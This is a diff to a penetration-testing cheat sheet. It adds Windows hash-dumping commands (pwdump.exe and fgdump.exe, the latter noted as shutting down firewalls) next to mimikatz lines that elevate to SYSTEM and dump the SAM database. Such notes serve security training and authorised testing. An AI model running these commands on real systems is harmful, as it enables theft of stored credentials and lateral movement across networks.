@@ -646,8 +646,9 @@ $ john --wordlist=rockyou.txt passwords.txt
 
 ## Active Directory / Lateral Movement
 
-### Dumping Hashes
+### Dumping Windows LM/HTLM Hashes
 
+Mimikatz.exe
 ```
 # Open mimikatz and escalate security token to SYSTEM integrity
 cmd> mimikatz.exe
@@ -657,6 +658,17 @@ mimikatz > token::elevate
 # Dump contents of SAM database
 mimikatz > lsadump::sam
 ```
+
+Pwdump.exe
+```
+cmd> pwdump.exe localhost
+```
+
+Fgdump.exe - improved pwdump, shutdown firewalls
+```
+cmd> fgdump.exe localhost
+```
+
 
 ### Pass The Hash
 
